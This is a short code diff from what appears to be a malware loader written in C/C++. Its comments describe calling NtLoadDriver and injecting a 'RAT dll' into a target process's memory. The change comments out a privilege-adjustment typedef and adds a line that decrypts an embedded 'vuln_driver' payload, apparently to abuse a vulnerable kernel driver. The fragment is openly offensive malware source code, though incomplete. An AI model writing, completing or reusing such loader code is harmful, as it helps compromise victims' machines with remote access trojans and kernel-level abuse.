@@ -4,12 +4,12 @@
 #include "resources.h"
 #include "junk_codes.h"
 
-typedef NTSTATUS (*NTAPI RtlAdjustPrivilege_t)(
-    ULONG Privilege,
-    BOOLEAN Enable,
-    BOOLEAN Client,
-    PBOOLEAN WasEnabled
-);
+//typedef NTSTATUS (*NTAPI RtlAdjustPrivilege_t)(
+//    ULONG Privilege,
+//    BOOLEAN Enable,
+//    BOOLEAN Client,
+//    PBOOLEAN WasEnabled
+//);
 
 int main(int argc, char** argv)
 {
@@ -21,7 +21,7 @@ int main(int argc, char** argv)
     * call NtLoadDriver()
     * - Possibly unload the driver after injecting
     */
-    
+    std::vector<uint8_t> vulnDriver = decrypt_bytes(vuln_driver);
 
     // Inject the RAT dll to the target process' virtual memory (after performing relocations)
 
